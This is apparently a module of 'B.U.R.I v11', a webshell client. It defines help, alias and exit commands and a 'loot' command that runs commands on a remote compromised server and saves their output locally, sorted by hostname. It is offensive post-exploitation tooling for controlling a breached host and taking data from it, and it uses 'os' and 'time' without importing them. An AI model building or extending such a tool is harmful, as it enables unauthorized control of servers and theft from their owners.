from .base_module import BaseModule
from rich.table import Table

class Module(BaseModule):
    @property
    def commands(self) -> list[str]:
        return ["help", "exit", "clear", "cls", "alias", "loot"]

    def get_help(self) -> dict:
        return {
            "help": ("", "Displays this help table."),
            "exit": ("", "Close the webshell session."),
            "clear": ("", "Clear the local terminal screen."),
            "cls": ("", "Clear the local terminal screen."),
            "alias": ("[name=value]", "Create a client-side alias for a command. No args lists current aliases."),
            "loot": ("<command>", "Executes a command and saves its output to the loot folder.")
        }

    def execute(self, args: list[str]):
        cmd = args.pop(0) if args else self.commands[0]

        if cmd == "help":
            self._handle_help()
        elif cmd == "exit":
            raise SystemExit
        elif cmd in ["clear", "cls"]:
            self.console.clear()
        elif cmd == "alias":
            self._handle_alias(args)
        elif cmd == "loot":
            self._handle_loot(args)

    def _handle_help(self):
        table = Table(title="B.U.R.I v11 Client Commands", border_style="green", show_lines=True)
        table.add_column("Command", style="cyan", no_wrap=True)
        table.add_column("Arguments", style="yellow")
        table.add_column("Description")

        all_help = {}
        for mod in self.shell.modules.values():
            if hasattr(mod, 'get_help'):
                all_help.update(mod.get_help())

        for cmd, (args, desc) in sorted(all_help.items()):
            table.add_row(cmd, args, desc)

        self.console.print(table)
        self.console.print("\n[italic]Any other command is executed on the remote server via its native shell.[/italic]")

    def _handle_alias(self, args: list[str]):
        if not args:
            if not self.shell.aliases:
                self.console.print("[yellow]No aliases defined.[/yellow]")
                return
            table = Table(title="Client-Side Aliases")
            table.add_column("Alias", style="cyan")
            table.add_column("Command", style="magenta")
            for name, cmd in self.shell.aliases.items():
                table.add_row(name, cmd)
            self.console.print(table)
        else:
            alias_def = "".join(args)
            if '=' not in alias_def:
                self.console.print("[red]Invalid format. Use: alias name=\"command\"[/red]")
                return
            name, command = alias_def.split('=', 1)
            command = command.strip('"\'') # Remove potential quotes
            self.shell.aliases[name] = command
            self.console.print(f"[green]Alias '{name}' set to '{command}'[/green]")

    def _handle_loot(self, args: list[str]):
        if not args:
            self.console.print("[red]Usage: loot <command_to_execute>[/red]")
            return

        command_to_run = " ".join(args)
        self.console.print(f"[cyan]Executing for loot: '{command_to_run}'...[/cyan]")
        data = self.shell.execute_command(command_to_run)
        output = data.get('output', '').strip()

        if data.get('status') == 'error' or not output:
            self.console.print(f"[red]Command failed or produced no output: {data.get('message', '')}[/red]")
            return

        loot_dir = os.path.join("loot", self.shell.hostname)
        os.makedirs(loot_dir, exist_ok=True)

        sanitized_cmd = command_to_run.replace(" ", "_").replace("/", "_")
        filename = f"{sanitized_cmd}_{int(time.time())}.txt"
        filepath = os.path.join(loot_dir, filename)

        try:
            with open(filepath, 'w') as f:
                f.write(output)
            self.console.print(f"[green]Loot saved to: [bold yellow]{filepath}[/bold yellow][/green]")
        except Exception as e:
            self.console.print(f"[red]Failed to save loot: {e}[/red]")